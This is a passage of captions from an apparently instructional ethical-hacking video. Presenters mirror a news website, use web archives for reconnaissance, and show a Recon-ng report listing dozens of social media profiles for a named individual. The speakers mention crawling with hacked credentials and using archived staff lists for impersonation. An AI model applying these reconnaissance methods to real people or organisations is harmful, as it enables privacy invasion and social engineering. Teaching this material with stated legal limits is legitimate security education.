wanna keep downloading.\n\n522\n00:26:53.600 --> 00:26:55.970\nI'm gonna let it start just to show\nyou what it looks like for a minute.\n\n523\n00:26:55.970 --> 00:26:57.230\nThen I'm gonna stop it.\n\n524\n00:26:57.230 --> 00:27:00.044\nI can add additional URLs,\nI could set options for\n\n525\n00:27:00.044 --> 00:27:01.856\nwhat kinda captures I wanna do.\n\n526\n00:27:01.856 --> 00:27:03.885\nIf I have proxy I can use that.\n\n527\n00:27:03.885 --> 00:27:08.471\nWhat kind of scan rules, do I wanna get\nZIP files, GIFs, TIFFs, you name it.\n\n528\n00:27:08.471 --> 00:27:11.945\nAll sorts of stuff, so\nI would probably put these in, right?\n\n529\n00:27:11.945 --> 00:27:13.351\nProgram them in like that.\n\n530\n00:27:13.351 --> 00:27:15.465\nExclude or include links.\n\n531\n00:27:15.465 --> 00:27:18.083\nWhat kind of limits do I want\nto set on the mirroring depth?\n\n532\n00:27:18.083 --> 00:27:21.513\nI didn't put any limits in, that's why\nit ran forever because I said, just go,\n\n533\n00:27:21.513 --> 00:27:23.000\nwhatever's out there grab.\n\n534\n00:27:23.000 --> 00:27:25.525\nSo I'm gonna be running this for\na year before it finishes.\n\n535\n00:27:25.525 --> 00:27:27.120\n>> [LAUGH]\n>> And it's such a dynamic website,\n\n536\n00:27:27.120 --> 00:27:29.010\nit's never gonna stop, that's the problem.\n\n537\n00:27:29.010 --> 00:27:32.920\nSo I've got that, I've got flow control\nhere, a number of concurrent connections\n\n538\n00:27:32.920 --> 00:27:36.570\nto download, the number of streams I\nwanna set up, the links that I wanna get.\n\n539\n00:27:36.570 --> 00:27:40.150\nI could spider this,\nI could do all sorts of crazy stuff.\n\n540\n00:27:40.150 --> 00:27:41.950\nSo when I go do that, click OK.\n\n541\n00:27:41.950 --> 00:27:44.720\nWhere I continue the interrupted download.\n\n542\n00:27:44.720 --> 00:27:46.300\nOkay, Next, right?\n\n543\n00:27:46.300 --> 00:27:52.380\nSo I could go ahead, and\nI can disconnect when finished.\n\n544\n00:27:52.380 --> 00:27:52.934\nOkay, hit Finish.\n\n545\n00:27:52.934 --> 00:27:54.280\nIt's gonna start running.\n\n546\n00:27:54.280 --> 00:27:55.510\nAnd this is what it looks like, right?\n\n547\n00:27:55.510 --> 00:27:59.660\nIt's gonna start building, and\nit's gonna load the cache so\n\n548\n00:27:59.660 --> 00:28:01.500\nit's gonna load what I already have and\njust pick back up.\n\n549\n00:28:01.500 --> 00:28:03.180\nAnd you see it's spidering.\n\n550\n00:28:03.180 --> 00:28:05.870\nThis is going out and\nit's grabbing all that content on one or\n\n551\n00:28:05.870 --> 00:28:07.519\nmore active connections as it goes.\n\n552\n00:28:07.519 --> 00:28:09.562\nJust literally, you're good.\n\n553\n00:28:09.562 --> 00:28:11.420\nBoom, and\nit just throws it in the buffer, and\n\n554\n00:28:11.420 --> 00:28:13.920\nstarts copying everything\nit can get its hands on.\n\n555\n00:28:13.920 --> 00:28:14.980\nIt's just gonna copy, so\n\n556\n00:28:14.980 --> 00:28:18.990\nif we let that run long enough, you'll\nsee multiple threads eventually spin up.\n\n557\n00:28:18.990 --> 00:28:21.440\nAnd it spiders different\nparts of the site.\n\n558\n00:28:21.440 --> 00:28:23.200\nRight now it's only running on one.\n\n559\n00:28:23.200 --> 00:28:25.717\nAnd you can see the amount\nof data that it's saving.\n\n560\n00:28:25.717 --> 00:28:28.810\nAnd there's 130 megs, approximately there.\n\n561\n00:28:28.810 --> 00:28:34.720\nLinks scanned, you know, 20 of 600,\nwhatever, about 700 files written, right?\n\n562\n00:28:34.720 --> 00:28:36.610\nIt's running for\nless than a minute so far and\n\n563\n00:28:36.610 --> 00:28:39.020\nit's already gathered\nover 200 megs of data.\n\n564\n00:28:39.020 --> 00:28:42.162\nSo you can see this thing is pretty quick,\nright?\n\n565\n00:28:42.162 --> 00:28:42.984\n>> Mm-hm.\n\n566\n00:28:42.984 --> 00:28:45.930\nAnd again at this point we\nhaven't crossed any lines, right?\n\n567\n00:28:45.930 --> 00:28:47.240\nWe're just retrieving HTML.\n\n568\n00:28:47.240 --> 00:28:49.388\n>> Right now, actually,\nwe're not even doing a live capture,\n\n569\n00:28:49.388 --> 00:28:52.440\nit's just parsing the file and loading\nall the file in, of the data that I have.\n\n570\n00:28:52.440 --> 00:28:53.990\nI have over a gigabyte of data, and\n\n571\n00:28:53.990 --> 00:28:57.180\nthe capture file it's gonna load that\nfirst, eventually it will go live.\n\n572\n00:28:57.180 --> 00:28:58.797\nBut yes, to your point,\n\n573\n00:28:58.797 --> 00:29:03.973\nwe're not actually doing anything where\nwe've crossed the line yet, right?\n\n574\n00:29:03.973 --> 00:29:05.045\nWe're flirting with the line.\n\n575\n00:29:05.045 --> 00:29:05.559\n>> Uh-huh.\n\n576\n00:29:05.559 --> 00:29:07.344\n>> We're saying,\nhello Mister Line, you're there.\n\n577\n00:29:07.344 --> 00:29:08.188\nHow nice.\n\n578\n00:29:08.188 --> 00:29:09.520\n>> [LAUGH]\n>> Nice to see you.\n\n579\n00:29:09.520 --> 00:29:13.130\nWhat's on the other side, let me look and\nsee but I'm not going over there.\n\n580\n00:29:13.130 --> 00:29:15.800\nBut, we have not broken any rules because\n\n581\n00:29:15.800 --> 00:29:17.610\nthis is information that\nis freely available,\n\n582\n00:29:17.610 --> 00:29:21.070\nthis is a public available website that\nmillions of people look at everyday.\n\n583\n00:29:21.070 --> 00:29:24.980\nNow is it ethical to spider\nthe entire site and mirror it?\n\n584\n00:29:24.980 --> 00:29:27.270\nYou're not breaking a law but\nwhy are you doing that?\n\n585\n00:29:27.270 --> 00:29:28.000\nWhat are you up to?\n\n586\n00:29:28.000 --> 00:29:31.630\nThere's clearly not a lot of reasons you\nwould need to do that unless you were up\n\n587\n00:29:31.630 --> 00:29:32.720\nto no good.\n\n588\n00:29:32.720 --> 00:29:34.320\nBut no, I have not broken the law.\n\n589\n00:29:35.370 --> 00:29:36.390\nJust to be clear.\n\n590\n00:29:36.390 --> 00:29:42.700\nNow, can you do this against a system\nthat is not in the public domain?\n\n591\n00:29:42.700 --> 00:29:44.350\nCan you do this against\na private corporate site?\n\n592\n00:29:44.350 --> 00:29:48.163\nNow you're probably crossing a line\nbecause when you do this against a site\n\n593\n00:29:48.163 --> 00:29:51.491\nthat is privately held,\nthat is not meant for anonymous access,\n\n594\n00:29:51.491 --> 00:29:53.265\nthen you've got issues, right?\n\n595\n00:29:53.265 --> 00:29:55.620\nAnd this tool could be used to do both.\n\n596\n00:29:55.620 --> 00:29:58.450\nYou actually can provide credentials\nhere to get into the system.\n\n597\n00:29:58.450 --> 00:30:01.050\nIf you hacked a credential\nyou could log in.\n\n598\n00:30:01.050 --> 00:30:04.200\nThis would then use that credential,\nspider the site and then pull it down.\n\n599\n00:30:04.200 --> 00:30:08.240\nSo you could clearly turn this into\na hacking tool very, very quickly.\n\n600\n00:30:08.240 --> 00:30:09.760\nAnd it is indeed that.\n\n601\n00:30:09.760 --> 00:30:11.700\nAnd most of these tools that we demo for\n\n602\n00:30:11.700 --> 00:30:15.770\nyou can be used as either hacking tools or\ncan be used right, for good,\n\n603\n00:30:15.770 --> 00:30:18.150\nin the sense that it can be\nused to assess vulnerabilities.\n\n604\n00:30:18.150 --> 00:30:20.430\nNow, if you're assessing\na private corporate site but\n\n605\n00:30:20.430 --> 00:30:23.130\nyou're given permission to do that,\nit's not breaking the law.\n\n606\n00:30:23.130 --> 00:30:25.360\nBut you have a piece of paper that\nsays you have rights to do that.\n\n607\n00:30:25.360 --> 00:30:29.690\nYou've been given the credential, you've\nput it in to the system and you do that.\n\n608\n00:30:29.690 --> 00:30:31.627\nIf you're just going out joy-riding and\n\n609\n00:30:31.627 --> 00:30:35.985\nsay, let me go hit up that Bank of America\nsite and see what's going on over there.\n\n610\n00:30:35.985 --> 00:30:37.990\n>> [LAUGH]\n>> That's probably not a really good idea.\n\n611\n00:30:37.990 --> 00:30:39.840\n>> Right.\n>> Then you're breaking the law.\n\n612\n00:30:39.840 --> 00:30:43.540\nAnd the authorities are gonna wanna come\ntalk to you at some point, right, and\n\n613\n00:30:43.540 --> 00:30:45.100\nfind out why you're doing that,\nwhat's going on.\n\n614\n00:30:45.100 --> 00:30:46.370\nSo I'm still parsing the file.\n\n615\n00:30:46.370 --> 00:30:49.270\nI'm still loading the file\nthat I captured, by the way.\n\n616\n00:30:49.270 --> 00:30:53.030\nI'm gonna let it load so we can actually\njust see it go live for a minute.\n\n617\n00:30:53.030 --> 00:30:53.850\nAnd let it run just so\n\n618\n00:30:53.850 --> 00:30:57.150\nwe can get a little more data then I'll\nactually show you the output of that.\n\n619\n00:30:57.150 --> 00:31:01.060\nYou'll see the headlines from yesterday\nbecause I ran this yesterday afternoon.\n\n620\n00:31:01.060 --> 00:31:01.563\n>> Okay.\n\n621\n00:31:01.563 --> 00:31:04.650\nObviously, we'll see whatever\nwas on CNN at that point.\n\n622\n00:31:04.650 --> 00:31:06.710\nBut you'll be able to go back\nessentially and look at it.\n\n623\n00:31:06.710 --> 00:31:10.050\nNow while I'm doing this can we use\nanother tool that's online that's\n\n624\n00:31:10.050 --> 00:31:12.930\nfree that doesn't require this\nto find the same information?\n\n625\n00:31:12.930 --> 00:31:15.071\nWe can go to the way back machine\n>> Yeah.\n\n626\n00:31:15.071 --> 00:31:18.203\n>> Or a bunch of other mirror sites\nthat maintain mirrors of the Internet\n\n627\n00:31:18.203 --> 00:31:18.750\nout there.\n\n628\n00:31:18.750 --> 00:31:21.520\nMike will probably find one\njust while we're talking.\n\n629\n00:31:21.520 --> 00:31:24.410\nAnd we can go look at web\narchives that are live,\n\n630\n00:31:24.410 --> 00:31:26.690\nessentially online that are maintained, so\n\n631\n00:31:26.690 --> 00:31:30.690\nI can see the status of a site at certain\npoints in time and not have to mirror it.\n\n632\n00:31:30.690 --> 00:31:33.680\nSo I could do fingerprinting and\nfootprinting and\n\n633\n00:31:33.680 --> 00:31:37.890\nreconnaissance without having to go to\nall the trouble to pulling down this.\n\n634\n00:31:37.890 --> 00:31:38.900\nNow it's actually gone live.\n\n635\n00:31:38.900 --> 00:31:39.600\nIt's transferring data.\n\n636\n00:31:39.600 --> 00:31:41.980\nYou see multiple threads\nare running there now.\n\n637\n00:31:41.980 --> 00:31:44.610\nIt says transferring data and\nit's actually going in and\n\n638\n00:31:44.610 --> 00:31:46.520\nit's starting to actually\npull the data down live.\n\n639\n00:31:46.520 --> 00:31:48.980\nSo, we'll let that go for\njust another minute.\n\n640\n00:31:48.980 --> 00:31:49.690\nThen I'll kill it and\n\n641\n00:31:49.690 --> 00:31:52.388\nwe'll actually take a look at\nthe output just to show it to you.\n\n642\n00:31:52.388 --> 00:31:53.802\nThen I wanna show you,\n\n643\n00:31:53.802 --> 00:31:58.651\njust to finish up, a really cool tool\ncalled Recon-ng out of the Linux side.\n\n644\n00:31:58.651 --> 00:32:02.326\nWe played with some WIndows tools,\nwe're gonna mix Linux and Windows,\n\n645\n00:32:02.326 --> 00:32:03.865\ncome up with Wilux or Linows.\n\n646\n00:32:03.865 --> 00:32:06.386\n>> [LAUGH]\n>> And we're gonna see how we can use this\n\n647\n00:32:06.386 --> 00:32:07.823\ntool call Recon-ng.\n\n648\n00:32:07.823 --> 00:32:10.771\nWhich is running on\nthe Cali Linux security suite.\n\n649\n00:32:10.771 --> 00:32:13.325\nAnd we're gonna go out, and this is\nthe thing I told you about with Facebook,\n\n650\n00:32:13.325 --> 00:32:15.140\nthat we're gonna do,\nthis really cool demo.\n\n651\n00:32:15.140 --> 00:32:18.600\nWe're gonna go out, and\nwe're gonna use the tool to essentially go\n\n652\n00:32:18.600 --> 00:32:21.350\nfind out whether somebody\nexists at a site.\n\n653\n00:32:21.350 --> 00:32:24.490\nPull down all the information about\nall their social media accounts and\n\n654\n00:32:24.490 --> 00:32:27.960\ncontacts, and then profile that\ninto a report, using this tool.\n\n655\n00:32:27.960 --> 00:32:30.300\nSo I'm gonna show you how to do that,\nas soon as we're done.\n\n656\n00:32:30.300 --> 00:32:32.770\nSo let's, so we've been [INAUDIBLE]\nmaybe we'll give it another minute.\n\n657\n00:32:32.770 --> 00:32:35.740\nDid you come up with a web archive, let's\ngo to Mike's machine for just a minute.\n\n658\n00:32:35.740 --> 00:32:37.110\nLet him just, show us that.\n\n659\n00:32:37.110 --> 00:32:39.740\nWhy don't you narrate on that real\nquick while I get this setup.\n\n660\n00:32:39.740 --> 00:32:40.820\n>> All right, I posted that link.\n\n661\n00:32:40.820 --> 00:32:44.258\nThis is just the way back machine,\nor archive.org.\n\n662\n00:32:44.258 --> 00:32:49.230\nAnd I typed in www.cnn.com up here and\nwhat it shows me, you can actually\n\n663\n00:32:49.230 --> 00:32:54.020\nsee kind of a graph across the top here\nof all the days that they've archived.\n\n664\n00:32:54.020 --> 00:32:56.690\nSome sites obviously\nwouldn't go back that far.\n\n665\n00:32:56.690 --> 00:33:01.400\nAnd then I've got the calendar view\ndown here so I could go to Sunday and\n\n666\n00:33:01.400 --> 00:33:04.310\nfigure what time to do that at,\nmid afternoon maybe.\n\n667\n00:33:04.310 --> 00:33:07.830\n>> I did that last\n>> Night, probably at about 6 o'clock or\n\n668\n00:33:07.830 --> 00:33:08.550\nsomething like that.\n\n669\n00:33:08.550 --> 00:33:12.780\n>> So we can go in here and we could pick\na link somewhere in their time 4 o'clock,\n\n670\n00:33:12.780 --> 00:33:17.160\n9 o'clock, if I can get my cursor\nto play along, there we go.\n\n671\n00:33:17.160 --> 00:33:19.760\nAnd it's going to pull up\nthat archived copy, right?\n\n672\n00:33:19.760 --> 00:33:22.900\nIt's taking snapshots of\nthese websites periodically.\n\n673\n00:33:22.900 --> 00:33:25.260\n>> Yeah, that's the headline\nyou're gonna see online.\n\n674\n00:33:25.260 --> 00:33:25.860\nIf I show you.\n\n675\n00:33:25.860 --> 00:33:30.470\nThat was right after, well not afer,\nbut it was reporting the aftermath\n\n676\n00:33:30.470 --> 00:33:35.080\non the attack in Orlando that occurred and\nI have that in my mirror as well.\n\n677\n00:33:35.080 --> 00:33:36.780\nAnd that's the exact headline.\n\n678\n00:33:36.780 --> 00:33:39.270\n>> And sometimes you can find\nsome really useful information.\n\n679\n00:33:39.270 --> 00:33:42.210\nI've got back to websites\n>> Is where maybe a company\n\n680\n00:33:42.210 --> 00:33:43.220\nhas gotten wise.\n\n681\n00:33:43.220 --> 00:33:47.730\nI know that they use to put an entire list\nof their staff and their extension on\n\n682\n00:33:47.730 --> 00:33:51.720\ntheir website, so that I might be able\nto gather that in my reconnaissance and\n\n683\n00:33:51.720 --> 00:33:55.270\nthen maybe do some impersonation or\nsome spoofing with it.\n\n684\n00:33:55.270 --> 00:33:56.740\nBut it's not on the website anymore.\n\n685\n00:33:56.740 --> 00:33:58.230\nBut I know I've seen it there.\n\n686\n00:33:58.230 --> 00:34:02.690\nI can use a tool like this to go back\nin time before they got wise and\n\n687\n00:34:02.690 --> 00:34:04.810\nremoved that information\nfrom their website.\n\n688\n00:34:04.810 --> 00:34:06.860\nIt can also be fun too,\nyou can go back to Microsoft and\n\n689\n00:34:06.860 --> 00:34:09.750\nlook at the days where\n98' was just rolled out.\n\n690\n00:34:09.750 --> 00:34:11.060\n>> Yeah.\n>> 98' was the-\n\n691\n00:34:11.060 --> 00:34:12.080\n>> The new and up coming thing.\n\n692\n00:34:12.080 --> 00:34:16.790\nActually it can be used as a very\npowerful way to do that reconnaissance.\n\n693\n00:34:16.790 --> 00:34:18.750\n>> Yep, so\nit's a great way to just do it again.\n\n694\n00:34:18.750 --> 00:34:21.980\nIt's kinda free of charge in the sense\nyou are not bearing the liability having\n\n695\n00:34:21.980 --> 00:34:23.140\nto go out and mirror the site.\n\n696\n00:34:23.140 --> 00:34:25.340\nYour just using snap shots\nthat have been made available.\n\n697\n00:34:25.340 --> 00:34:27.300\nAnd are publicly available out on the web.\n\n698\n00:34:27.300 --> 00:34:28.600\nWe can go back to my machine.\n\n699\n00:34:28.600 --> 00:34:31.030\n>> I just went ahead and and\nstopped the capture, we were running it.\n\n700\n00:34:31.030 --> 00:34:33.680\nSo I just stopped it,\nyou can see that it's gonna\n\n701\n00:34:33.680 --> 00:34:37.010\ngive me the option now in the tool\nto go browse the mirrored website,\n\n702\n00:34:37.010 --> 00:34:39.480\nwhich is all this\ninformation you see here.\n\n703\n00:34:39.480 --> 00:34:42.670\nSo I'm gonna click that,\nit's gonna load up, okay?\n\n704\n00:34:42.670 --> 00:34:43.970\nAnd you see right there?\n\n705\n00:34:43.970 --> 00:34:45.620\nThat's the full picture and\n\n706\n00:34:45.620 --> 00:34:48.960\narchive that Mike was gonna show\nyou Just unload everything.\n\n707\n00:34:48.960 --> 00:34:50.630\nBut that's mine that's running.\n\n708\n00:34:50.630 --> 00:34:53.280\nAnd if you look at the URL,\nit's up in the browser.\n\n709\n00:34:53.280 --> 00:34:55.150\nIt may be hard to see, but\n\n710\n00:34:55.150 --> 00:35:00.400\nthe URL is file//C/mywebsitemirror CNN,\nblah, blah, blah.\n\n711\n00:35:00.400 --> 00:35:04.480\nAnd so if I just copy that just so\nyou can see that.\n\n712\n00:35:06.070 --> 00:35:11.580\nWe'll just go in here real quick and\nwe will do the following.\n\n713\n00:35:14.470 --> 00:35:20.520\nJust open up Notepad And we wait.\n\n714\n00:35:20.520 --> 00:35:21.750\nThere we go.\n\n715\n00:35:21.750 --> 00:35:26.624\nAnd when we open up Notepad,\nI'll paste in the path that I just copied.\n\n716\n00:35:29.201 --> 00:35:31.550\nAnd just make it a little bit bigger for\nyou to see.\n\n717\n00:35:32.980 --> 00:35:35.080\nThat's the path that I just\ncopied out of the browser.\n\n718\n00:35:35.080 --> 00:35:36.100\nYou could see the path is local.\n\n719\n00:35:36.100 --> 00:35:36.710\n>> All right.\n\n720\n00:35:36.710 --> 00:35:39.870\n>> And so that's what's actually being\ndisplayed is all that information I\n\n721\n00:35:39.870 --> 00:35:41.850\nmirrored down to my machine, right?\n\n722\n00:35:41.850 --> 00:35:42.470\n>> Very cool.\n\n723\n00:35:42.470 --> 00:35:45.450\n>> So, it's showing me that\nfrozen moment in time, right?\n\n724\n00:35:45.450 --> 00:35:46.800\nJust like we were saying.\n\n725\n00:35:46.800 --> 00:35:48.530\nIt's got everything there.\n\n726\n00:35:48.530 --> 00:35:53.470\nAnd you can see I'm able to click on\nthe links, I'm not going to of course,\n\n727\n00:35:53.470 --> 00:35:56.320\nbut I can click on the links and\nyou'll start bringing up stuff.\n\n728\n00:35:56.320 --> 00:35:58.630\nSo I've got that capability as well.\n\n729\n00:35:58.630 --> 00:36:02.140\nNow what I'm gonna do is I'm gonna close\nyou know just the tabs in the browser\n\n730\n00:36:02.140 --> 00:36:03.170\nhere there we go.\n\n731\n00:36:03.170 --> 00:36:05.570\nI'm gonna exit out of\nthe program just let that close.\n\n732\n00:36:05.570 --> 00:36:08.690\nI'm gonna minimize this Windows 8\nmachine cuz we're gonna switch over.\n\n733\n00:36:08.690 --> 00:36:11.710\nI'm gonna bring up the Cali Linux machine,\nso let me do that.\n\n734\n00:36:11.710 --> 00:36:14.310\nWe're running the latest build of Kali.\n\n735\n00:36:14.310 --> 00:36:20.110\nThat is going to be, just make sure\nthat that goes full screen there...\n\n736\n00:36:20.110 --> 00:36:22.270\nThat is going to be the 216.1 build.\n\n737\n00:36:22.270 --> 00:36:27.700\nThey've gone to a rev build cycle now,\non Kali, so we're actually using that\n\n738\n00:36:27.700 --> 00:36:31.900\nlatest release, thanks to the magical,\nmythical Mr. Nate who built that for us.\n\n739\n00:36:31.900 --> 00:36:32.540\n>> He does a great job.\n\n740\n00:36:32.540 --> 00:36:34.030\n>> So I'm gonna go ahead and log in.\n\n741\n00:36:34.030 --> 00:36:36.153\nWe've already got this up and running.\n\n742\n00:36:36.153 --> 00:36:40.790\nUse our super-secret password,\ncalled password.\n\n743\n00:36:40.790 --> 00:36:44.040\n[LAUGH] And I'm just gonna log in here.\n\n744\n00:36:44.040 --> 00:36:47.590\nLet me just get rid of\nthat particular app.\n\n745\n00:36:47.590 --> 00:36:51.620\nNow, you have not use Cali before,\nthis distribution of Linux\n\n746\n00:36:51.620 --> 00:36:55.090\nis a security distribution,\nit's got most not quite all but\n\n747\n00:36:55.090 --> 00:36:59.220\nquite a number of the security tools built\nin, we'll be demoing in and out of Cali\n\n748\n00:36:59.220 --> 00:37:03.030\nall throughout our conversation\nthroughout the episodes we're doing.\n\n749\n00:37:03.030 --> 00:37:06.490\nIt's gonna be our primary Linux platform\nof choise to show you the hacking tools.\n\n750\n00:37:06.490 --> 00:37:08.890\nWe'll take a look at\nthe metasploit framework in here.\n\n751\n00:37:08.890 --> 00:37:12.400\nWe'll take a look at the social\nengineering security toolkit.\n\n752\n00:37:12.400 --> 00:37:14.820\nWe'll take a look at recon-ng,\nwhich I'm gonna show you right now.\n\n753\n00:37:14.820 --> 00:37:16.470\nWe'll take a look at Nmap.\n\n754\n00:37:16.470 --> 00:37:18.320\nThe good old, real version Nmap.\n\n755\n00:37:18.320 --> 00:37:20.620\nWe'll take a look at\nthe Windows port of Nmap.\n\n756\n00:37:20.620 --> 00:37:23.180\nZenmap at some point as well and\nthe Windows side.\n\n757\n00:37:23.180 --> 00:37:24.610\nAlso, we're gonna be in and\nout of here quite a bit.\n\n758\n00:37:24.610 --> 00:37:28.570\nWe've got a shortcut a list,\nsome icons for tools that we're gonna use.\n\n759\n00:37:28.570 --> 00:37:30.480\nThey're here,\nas you can see the burp suite, and\n\n760\n00:37:30.480 --> 00:37:33.590\nmetasploit, and stuff like that.\n\n761\n00:37:33.590 --> 00:37:35.985\nBut in addition,\nwe've got a little browser,\n\n762\n00:37:35.985 --> 00:37:39.775\npick this show applications item that we\ncan do to bring all the app categories up.\n\n763\n00:37:39.775 --> 00:37:41.235\nWhich is kind of cool.\n\n764\n00:37:41.235 --> 00:37:43.985\nGone are the days where you have to\nnavigate Linux from the command line.\n\n765\n00:37:45.275 --> 00:37:46.805\nWe have a search feature as well.\n\n766\n00:37:46.805 --> 00:37:49.062\nIf I don't know exactly\nwhat category of tool.\n\n767\n00:37:49.062 --> 00:37:51.642\nPools that I have, that I want to use,\nand there's many of them in here.\n\n768\n00:37:51.642 --> 00:37:55.012\nYou could see we have vulnerability,\ntools, we have web app tools, database.\n\n769\n00:37:55.012 --> 00:37:59.932\nWe have post exploit tools, sniffing,\nwireless forensics, reporting.\n\n770\n00:37:59.932 --> 00:38:02.790\nSecurity Engineering tool kit tools,\nforensics and\n\n771\n00:38:02.790 --> 00:38:04.560\nserves as all sorts of stuff.\n\n772\n00:38:04.560 --> 00:38:05.930\nThere's quite a number of tools.\n\n773\n00:38:05.930 --> 00:38:08.945\nBut if I don't know,\nI can just come in here, start searching.\n\n774\n00:38:08.945 --> 00:38:12.200\nRecon-ng is the only tool\nthat's called recon, so\n\n775\n00:38:12.200 --> 00:38:13.940\nit immediately brings it up for me.\n\n776\n00:38:13.940 --> 00:38:15.683\nWouldn't it be great if\nWindows worked like this?\n\n777\n00:38:15.683 --> 00:38:18.730\n>> [LAUGH]\n>> I don't know, in Windows 12 or\n\n778\n00:38:18.730 --> 00:38:19.250\nsomething?\n\n779\n00:38:19.250 --> 00:38:19.960\nAnd you could do that?\n\n780\n00:38:19.960 --> 00:38:21.810\nThat would just be so cool.\n\n781\n00:38:21.810 --> 00:38:24.630\nSo, I guess somebody has to think\nof it first, I suppose, right?\n\n782\n00:38:24.630 --> 00:38:26.190\n>> Exactly.\n>> So I'm gonna be able to click on that,\n\n783\n00:38:26.190 --> 00:38:28.640\nwe're gonna launch this tool,\nso let me just do that.\n\n784\n00:38:28.640 --> 00:38:32.560\nWe're gonna get our Recon-ng terminal,\nit comes up, right.\n\n785\n00:38:32.560 --> 00:38:37.400\nSo it's gonna show us the current version,\n4.7.2.\n\n786\n00:38:37.400 --> 00:38:43.110\nAnd so we've got that there and so\nwhat I'm gonna do, is I'm gonna go in.\n\n787\n00:38:43.110 --> 00:38:46.690\nAnd normally,\nI would create a work space in here and\n\n788\n00:38:46.690 --> 00:38:49.520\nI would do that by actually going in and\n\n789\n00:38:49.520 --> 00:38:54.590\ntyping in work spaces and I would then\nuse add and I would give it a name.\n\n790\n00:38:54.590 --> 00:38:56.620\nRight, like Adam one.\n\n791\n00:38:56.620 --> 00:38:58.150\nAnd that would create a work space for\n\n792\n00:38:58.150 --> 00:39:01.130\nme to store the information I'm\ngonna create and things like that,\n\n793\n00:39:01.130 --> 00:39:06.220\nand you can see I'm now in the Atom 1\nworkspace and I've got that information.\n\n794\n00:39:06.220 --> 00:39:09.870\nNow what I'm gonna do is show you what\nthis tool does, the output of it.\n\n795\n00:39:09.870 --> 00:39:11.789\nAnd then I'm gonna work backwards and\nshow you how I got there.\n\n796\n00:39:12.920 --> 00:39:14.540\nSo let's take a look at\nwhat this tool does and\n\n797\n00:39:14.540 --> 00:39:16.590\nI'm gonna walk you through\nthe steps on how we get this.\n\n798\n00:39:16.590 --> 00:39:18.300\nI've already run in this in other words.\n\n799\n00:39:18.300 --> 00:39:21.170\nI've created the report and\nI've gone out and I've just stored it so\n\n800\n00:39:21.170 --> 00:39:22.370\nI'm gonna go to files here.\n\n801\n00:39:22.370 --> 00:39:24.900\nI'm gonna go in, I'm in.\n\n802\n00:39:24.900 --> 00:39:25.950\nJust go up here.\n\n803\n00:39:28.050 --> 00:39:30.830\nI've created a directory called Adam so\nI just have a directory in there so\n\n804\n00:39:30.830 --> 00:39:36.510\nI can store stuff, and in Adam I\nhave a recon dot html report, right?\n\n805\n00:39:36.510 --> 00:39:37.810\nSo, I'm just gonna use that.\n\n806\n00:39:37.810 --> 00:39:38.860\nI'm gonna bring that up.\n\n807\n00:39:38.860 --> 00:39:41.630\nSo, I'm gonna double click on,\nit's gonna open up in just a minute.\n\n808\n00:39:41.630 --> 00:39:44.770\nIt's gonna open the web browser here,\nice weasel.\n\n809\n00:39:44.770 --> 00:39:46.650\nAgain, I would love the ability.\n\n810\n00:39:46.650 --> 00:39:51.440\nLike who sits in a room and goes,\nyeah, we did a web browser, let's see.\n\n811\n00:39:51.440 --> 00:39:53.910\nA small furry rodent that is cold.\n\n812\n00:39:53.910 --> 00:39:55.200\nYeah, so I want to name it Ice Weasel.\n\n813\n00:39:55.200 --> 00:39:57.080\nThat is what I'm going\nto call that browser.\n\n814\n00:39:57.080 --> 00:39:58.260\n>> And that's the name.\n\n815\n00:39:58.260 --> 00:40:00.050\nAnd then children,\nthat's how the story goes.\n\n816\n00:40:00.050 --> 00:40:04.919\n>> So we have the Ice Weasel browser, so\nit's the built-in browser on the platform.\n\n817\n00:40:04.919 --> 00:40:05.895\nAnd you may notice that name.\n\n818\n00:40:05.895 --> 00:40:07.151\nYou may know who that person is.\n\n819\n00:40:07.151 --> 00:40:07.783\n>> Yeah, looks familiar.\n\n820\n00:40:07.783 --> 00:40:08.967\n>> Yeah.\nRight?\n\n821\n00:40:08.967 --> 00:40:09.895\nOur buddy Mark.\n\n822\n00:40:09.895 --> 00:40:15.074\nSo Mr. Zuckerberg, the principal behind\nFacebook, among all the other things\n\n823\n00:40:15.074 --> 00:40:19.960\nthat he is a party involved with and/or\nto, was profiled using this tool.\n\n824\n00:40:19.960 --> 00:40:23.010\nNow, before we go any further and\nwe get a nasty cease and\n\n825\n00:40:23.010 --> 00:40:24.750\ndesist letter from somebody's lawyer.\n\n826\n00:40:24.750 --> 00:40:28.220\nLet me be clear, all we did, and\nI'm gonna show you how we did it,\n\n827\n00:40:28.220 --> 00:40:32.990\nwas go out to Facebook, use this tool\nto profile Facebook, looking for\n\n828\n00:40:32.990 --> 00:40:36.170\nusers that have publicly\navailable information on the site,\n\n829\n00:40:36.170 --> 00:40:40.340\nwe pulled them in, and then through\na variety of additional commands,\n\n830\n00:40:40.340 --> 00:40:43.840\nasked the computer to take those users,\ngo out and search for them and\n\n831\n00:40:43.840 --> 00:40:48.480\nfind any associated social media accounts\nthat may be publicly available, and\n\n832\n00:40:48.480 --> 00:40:49.720\nthen to list them.\n\n833\n00:40:49.720 --> 00:40:54.710\nAnd so, when I did that, what I get is\nthis and then output it into HTML format.\n\n834\n00:40:54.710 --> 00:40:58.010\nI could do this as a CSV file,\nvarious things.\n\n835\n00:40:58.010 --> 00:41:01.160\nSo I did that and what I get is,\n\n836\n00:41:01.160 --> 00:41:05.600\nI have 63 profiles right there\nthat exist for this person.\n\n837\n00:41:05.600 --> 00:41:08.075\nSo let's go down here to profiles.\n\n838\n00:41:09.330 --> 00:41:10.910\nAnd let's just come over here.\n\n839\n00:41:13.280 --> 00:41:16.300\nLet's just scroll a little bit more.\n\n840\n00:41:16.300 --> 00:41:20.140\nAnd I could begin to see that\non read it he's listed and\n\n841\n00:41:20.140 --> 00:41:25.670\nhe has a profile there, on Facebook, on\nPinterest, on Slack, on Vine, on Tumblr.\n\n842\n00:41:25.670 --> 00:41:26.575\nNeed I continue?\n\n843\n00:41:26.575 --> 00:41:29.030\n>> [LAUGH]\n>> There's 60 additional ones on there\n\n844\n00:41:29.030 --> 00:41:35.500\nthat list him that have all of his social\nmedia information associated with it.\n\n845\n00:41:35.500 --> 00:41:38.500\nAnd I can see all of that in this report.\n\n846\n00:41:38.500 --> 00:41:40.590\nSo I'm gonna show you how to get that.\n\n847\n00:41:40.590 --> 00:41:41.810\nThat's what this tool does.\n\n848\n00:41:43.070 --> 00:41:44.614\nSo let's just get out of here.\n\n849\n00:41:44.614 --> 00:41:51.530\nLet's just close the Iceweasel browser.\n\n850\n00:41:51.530 --> 00:41:52.350\nLet's just get rid of that.\n\n851\n00:41:52.350 --> 00:41:54.870\nAll right, so let's get into the tools.\n\n852\n00:41:54.870 --> 00:41:57.700\nSo we're in the recon NG 